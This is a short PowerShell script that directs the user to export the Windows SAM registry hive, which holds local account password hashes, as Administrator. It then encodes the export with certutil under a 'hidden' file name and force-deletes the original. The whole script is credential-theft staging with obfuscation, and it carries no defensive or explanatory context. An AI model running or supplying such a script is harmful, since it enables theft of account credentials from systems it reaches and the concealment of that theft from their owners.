# Path to the registry file
$regFile = ".\hidden_sam.reg"
$encodedFile = ".\hidden_sam_encoded.txt"

# Check if the registry file exists
if (-not (Test-Path $regFile)) {
    Write-Host "Registry file not found at $regFile. Export it using 'reg export HKEY_LOCAL_MACHINE\SAM hidden_sam.reg' as Administrator."
    exit 1
}

# Encode the registry file
try {
    certutil -encode $regFile $encodedFile
    Write-Host "Registry file encoded to $encodedFile."
    Remove-Item $regFile -Force
} catch {
    Write-Host "Failed to encode registry file: $_"
    exit 1
}